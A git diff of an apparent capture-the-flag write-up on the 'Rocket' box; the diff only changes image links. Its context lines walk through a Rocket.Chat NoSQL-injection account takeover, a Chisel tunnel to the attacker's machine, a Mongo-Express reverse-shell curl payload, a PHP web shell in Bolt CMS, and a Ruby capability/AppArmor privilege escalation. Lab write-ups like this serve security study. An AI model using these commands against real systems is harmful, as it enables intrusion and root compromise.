@@ -44,11 +44,11 @@ There are just two ports open:
 
 Default scripts show that the site redirects us to rocket.thm so I add that to my `/etc/hosts` file. I also fire up Gobuster to start searching for subdirectories/subdomains in the background before heading over to the webpage. The landing page is a typical site for a company selling services, they seem to offer entertainment packages interested customers.
 
-![](../assets/img/2026-02-15-Rocket/1.png)
+![](/assets/img/2026-02-15-Rocket/1.png)
 
 A lot of the site is missing functionality for things like purchasing packages and sending contact forms, but there is a section for their employees which gives us a list of names and their corresponding emails. I'll add those to a wordlist in case we need them for a brute-force or other attacks later on.
 
-![](../assets/img/2026-02-15-Rocket/2.png)
+![](/assets/img/2026-02-15-Rocket/2.png)
 
 Checking around the different tabs shows a few parameters that take in sequential numbers (ie. `page=`), but nothing is injectable. I also can't seem to find a login or admin panel for users here, so let's wait for enumeration to give us anything. While fuzzing for subdomains, I discover that chat responds with a `200 OK` code. 
 
@@ -84,7 +84,7 @@ chat                    [Status: 200, Size: 224515, Words: 12566, Lines: 490, Du
 ### Chat subdomain
 After adding that to my hosts file, I navigate to it and find a login panel for the `rocket.chat` application. This is actually a real open-source platform, not their own proprietary platform.
 
-![](../assets/img/2026-02-15-Rocket/3.png)
+![](/assets/img/2026-02-15-Rocket/3.png)
 
 We are able to register an account under a user-provided name so we can start testing for exploits internally. Once registered, we're given the option to apply a username that would be displayed to others. I tested this for server-side template injection but nothing come of it.
 
@@ -104,7 +104,7 @@ Shellcodes: No Results
 
 Attempting to capture another user's token via XSS payloads yielded no results, so it seems our version is above `v2.1.0`. If vulnerable, it would've allowed us to just embed a link into a chat message for other users to automatically load and send cookies over the connection.
 
-![](../assets/img/2026-02-15-Rocket/4.png)
+![](/assets/img/2026-02-15-Rocket/4.png)
 
 ## NoSQL Injection
 The second is [CVE-2021-22911](https://nvd.nist.gov/vuln/detail/CVE-2021-22911), unauthenticated NoSQL injection leading to remote code execution via the administrative privileges over the site. This exploit works due to unsanitized user-input in the Reset Password Token field. Attackers can inject NoSQL payloads using the $regex operator to expose the full token and reset account properties without authentication. 
@@ -317,13 +317,13 @@ Due to the nature of NoSQL injection in this field and the fact that the site ma
 $ python3 exploit.py -u "cbev@rocket.thm" -a "admin@rocket.thm" -t "http://chat.rocket.thm"
 ```
 
-![](../assets/img/2026-02-15-Rocket/5.png)
+![](/assets/img/2026-02-15-Rocket/5.png)
 
 Crap, the script wasn't able to authenticate for some reason. After some debugging without having to run the script in its entirety again, I figure out that it wasn't able to supply a Base32 value to the 2FA field because the administrator's account didn't have it enabled. Either way, the password was still changed to `P@$$w0rd!1234` which works to login via the panel.
 
 There aren't any crazy features on the main page, however we are now able to authenticate to the `/admin` directory without the server throwing a `403 Forbidden` code.
 
-![](../assets/img/2026-02-15-Rocket/6.png)
+![](/assets/img/2026-02-15-Rocket/6.png)
 
 ## Initial Foothold
 I cut the RCE part out of the script to grab my shell however, this is the final revised script to reset the admin's password and get RCE on the server:
@@ -484,12 +484,12 @@ rce()
 
 Once that's done running, we get a successful shell on the box as rocketchat and can start looking around for ways to escalate privileges to root. Judging by the system's string after our account name, it's obvious we're in a Docker container. The best way to escape containers is by enumerating our permissions and finding an accessible database in order to dump hashes for use elsewhere.
 
-![](../assets/img/2026-02-15-Rocket/7.png)
+![](/assets/img/2026-02-15-Rocket/7.png)
 
 ### Docker escape
 I use the `env` command to check the environment information, which discloses a MongoDB Web Interface running on port 8081. There's not much else on the system for us so we'll need a way to reach this from out attacking machine for more tools. 
 
-![](../assets/img/2026-02-15-Rocket/8.png)
+![](/assets/img/2026-02-15-Rocket/8.png)
 
 The container doesn't have access to Netcat or any other real networking tools for us to transfer files over, so we'll have to use our clipboard to copy/paste a tunneling tool onto the container. Even though it's larger, I'll be using [Chisel](https://github.com/jpillora/chisel) to port forward the Mongo service to my machine due to it being stable and very easy to use.
 
@@ -536,11 +536,11 @@ $ ./chisel client MACHINE_IP:8000 R:8081:172.17.0.4:8081
 
 Once that's all set up, we can visit the site by going to `localhost:8081` in a browser or using a tool like cURL. Looks like we need authentication before we can access the MongoDB Web Interface.
 
-![](../assets/img/2026-02-15-Rocket/9.png)
+![](/assets/img/2026-02-15-Rocket/9.png)
 
 Using cURL on the webpage shows relatively the same stuff except for the X-Powered-By header showing that it might be the Mongo-Express service.
 
-![](../assets/img/2026-02-15-Rocket/10.png)
+![](/assets/img/2026-02-15-Rocket/10.png)
 
 ### Exploiting Mongo-Express
 There isn't much else to go off of besides brute-forcing, so I take to Google in order to find any known vulnerabilities for it. This reveals [CVE-2019–10758](https://nvd.nist.gov/vuln/detail/CVE-2019-10758) which explains that versions before 0.54.0 are vulnerable to RCE via endpoints that use the toBSON method. Some more digging gives me this [PoC](https://github.com/masahiro331/CVE-2019-10758) containing a cURL command to execute a reverse shell.
@@ -551,29 +551,29 @@ curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=
 
 Once we have a shell through that, I head towards any files containing BSON information to grab any credentials/hashes. Inside of `/backup/backup_db/meteor/` is a `users.bson` file which gives us bcrypt hashes for Laurent and Terrence.
 
-![](../assets/img/2026-02-15-Rocket/11.png)
+![](/assets/img/2026-02-15-Rocket/11.png)
 
 Now let's send those hashes over to Hashcat or JohnTheRipper to get the plaintext version.
 
-![](../assets/img/2026-02-15-Rocket/12.png)
+![](/assets/img/2026-02-15-Rocket/12.png)
 
 ### Reverse Shell via Bolt CMS
 Only one of them cracks, so now we need somewhere to use it. While enumerating the site at the beginning of this challenge, Wappalyzer showed that it was built using BoltCMS. The default login page for apps using that is `/bolt`, let's try supplying those new-found credentials there.
 
-![](../assets/img/2026-02-15-Rocket/13.png)
+![](/assets/img/2026-02-15-Rocket/13.png)
 
 As with most content management site's, we can grab a reverse shell by just updating the source code for a certain page to contain a PHP payload. In this case, I change `bundles.php` under Configuration -> All configurations files. 
 
-![](../assets/img/2026-02-15-Rocket/14.png)
+![](/assets/img/2026-02-15-Rocket/14.png)
 
 Now setup a listener and refresh the page to proc it. 
 
-![](../assets/img/2026-02-15-Rocket/15.png)
+![](/assets/img/2026-02-15-Rocket/15.png)
 
 ## Privilege Esclation
 At this point we can grab the user flag under Alvin's home directory and start looking at ways to escalate privileges to root user. Checking the usual things such as SUID bits set, crontabs running personal scripts, or unsecured backups revealed nothing. I did find that the Ruby binary had the `cap_setuid+ep` capability set on it, meaning that we could execute Ruby code as root. 
 
-![](../assets/img/2026-02-15-Rocket/16.png)
+![](/assets/img/2026-02-15-Rocket/16.png)
 
 All we really should have to do is spawn a shell using a Ruby command to get root privileges on the box.
 
@@ -581,13 +581,13 @@ All we really should have to do is spawn a shell using a Ruby command to get roo
 /usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "/bin/sh"'
 ```
 
-![](../assets/img/2026-02-15-Rocket/17.png)
+![](/assets/img/2026-02-15-Rocket/17.png)
 
 Hmm, it throws an error saying operation not permitted. This meant that the user running isn't privileged and that the provided UID doesn't match the SUID of who is calling the process. This really didn't make much sense to me as it had the capability set, so I took a bit of time to figure out exactly why this was happening.
 
 Turns out AppArmor was installed on this version of Ruby. Its sole purpose is to bind attributes pertaining to access control to processes rather than users, so that attempts like ours fail.
 
-![](../assets/img/2026-02-15-Rocket/18.png)
+![](/assets/img/2026-02-15-Rocket/18.png)
 
 Checking the configuration file for AppArmor on Ruby v2.5 shows a few permissions regarding files/directories. In particular, we have access to read and write files using this binary to the `/tmp` directory if the file starts with `.X[0–9]` and ends with `-lock`. We can exploit this to copy other binaries to `/tmp` under the guise of valid files and change the SUID bit so that we're able to execute it as a privileged user.
 
@@ -626,7 +626,7 @@ $ /usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X0
 
 Finally, once we confirm that the new bash clone is owned by root and has the SUID bit set, we can spawn a root shell by calling it with `-p`.
 
-![](../assets/img/2026-02-15-Rocket/19.png)
+![](/assets/img/2026-02-15-Rocket/19.png)
 
 Grabbing the final flag under `/root` dir completes this challenge. This box was a pretty fun one, I can see how it can be very challenging if you miss a bit of enumeration. I really enjoyed the privilege escalation vector, because although capabilities on binaries are nothing new, this method was very creative. 
 
